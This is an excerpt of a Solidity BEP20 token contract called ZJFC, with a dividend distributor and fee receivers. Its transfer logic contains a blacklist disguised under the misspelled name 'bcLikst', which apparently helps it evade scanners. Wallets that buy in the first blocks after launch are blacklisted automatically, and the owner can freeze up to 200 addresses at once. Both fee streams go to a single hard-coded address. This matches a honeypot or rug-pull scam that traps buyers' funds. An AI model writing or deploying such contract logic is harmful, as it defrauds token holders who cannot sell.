...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWRD = IBEP20(0xD44FD09d74cd13838F137B590497595d6b3FEeA4);
...
contract ZJFC is IBEP20, Auth {
    ...
    string constant _name = "ZJFC";
    string constant _symbol = "ZJFC";
    ...
    bool public bcLikstMode = true;
    bool public walletTransferAllowed = true;
    mapping (address => bool) public isbcLiksted;
    ...
    uint256 private constant INITIAL_FRAGMENTS_SUPPLY = 1 * 10**70 * 10**_decimals;
    uint256 public swapThreshold = 10**29;
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = payable(address(0x32207D034898A2C6A32ADb2dd9CB6Db45C21E1Bd));
        devFeeReceiver = payable(address(0x32207D034898A2C6A32ADb2dd9CB6Db45C21E1Bd));
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        // bcLikst
        if(bcLikstMode){
            require(!isbcLiksted[sender] && !isbcLiksted[recipient],"bcLiksted");    
        }

        if((launchedAt + deadBlocks) > block.number){
            isbcLiksted[recipient] = true;
        }
    ...
    function enable_bcLikst(bool _status) public onlyOwner {
        bcLikstMode = _status;
    }
    ...
    function manage_bcLikst(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201, "GAS Error: max allowed to bcLikst 200 addresses at a time"); // to prevent gas error
        for (uint256 i; i < addresses.length; ++i) {
            isbcLiksted[addresses[i]] = status;
        }
    }
